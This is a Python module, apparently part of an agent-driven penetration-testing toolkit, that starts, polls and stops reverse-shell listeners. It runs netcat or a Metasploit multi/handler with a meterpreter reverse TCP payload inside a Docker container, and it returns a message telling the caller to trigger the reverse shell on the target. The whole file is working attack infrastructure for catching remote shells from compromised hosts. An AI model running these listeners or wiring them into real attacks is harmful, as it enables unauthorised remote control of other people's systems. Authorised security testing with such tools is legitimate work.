"""Local reverse-shell listeners (改造⑦-①).

- listener_start: spawn a background `nc -lvnp <port>` (or a Metasploit handler in the
                  Linux sidecar) and log everything.
- listener_poll:  tail the listener log (who connected, first bytes typed).
- listener_stop:  terminate the listener.
"""
import os
import subprocess
import time
from typing import Any, Dict

_LISTENERS: Dict[int, Dict[str, Any]] = {}  # port -> {proc, log, type, start}

NC = "nc"  # macOS nc


def listener_start(port: int = 4444, listener_type: str = "nc", msf_payload: str = "") -> Dict[str, Any]:
    if port in _LISTENERS:
        return {"success": False, "error": f"listener already running on :{port}"}
    log = f"/tmp/hx_listener_{port}.log"
    logf = open(log, "w")
    proc = None
    if listener_type == "msf":
        inner = (f"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD "
                 f"{_msf_default(msf_payload)}; set LPORT {port}; set ExitOnSession false; "
                 f"run -j -z; sleep 3600; exit\"")
        proc = subprocess.Popen(["docker", "exec", "-i", "hexstrike-linux", "bash", "-lc", inner],
                                stdout=logf, stderr=subprocess.STDOUT)
    else:
        proc = subprocess.Popen(["nc", "-lvnp", str(port)], stdout=logf, stderr=subprocess.STDOUT)
    _LISTENERS[port] = {"proc": proc, "log": log, "type": listener_type, "start": time.time()}
    time.sleep(1.0)
    if proc.poll() is not None:
        return {"success": False, "error": "listener exited immediately",
                "log_tail": open(log, errors="replace").read()[-500:]}
    return {"success": True, "port": port, "type": listener_type, "log": log,
            "note": "start the reverse shell on the target now, then listener_poll to see the connection"}


def _msf_default(payload: str) -> str:
    return payload or "linux/x64/meterpreter_reverse_tcp"


def listener_poll(port: int = 4444) -> Dict[str, Any]:
    if port not in _LISTENERS:
        return {"success": False, "error": f"no listener on :{port} (listener_start first)"}
    log = _LISTENERS[port]["log"]
    tail = ""
    if os.path.exists(log):
        tail = open(log, errors="replace").read()
    return {"success": True, "port": port, "type": _LISTENERS[port]["type"],
            "connected": ("connect" in tail.lower() or "connection" in tail.lower()),
            "log_tail": tail[-2500:]}


def listener_stop(port: int = 4444) -> Dict[str, Any]:
    if port not in _LISTENERS:
        return {"success": False, "error": f"no listener on :{port}"}
    proc = _LISTENERS.pop(port)["proc"]
    try:
        proc.terminate()
        proc.wait(timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass
    return {"success": True, "port": port, "stopped": True}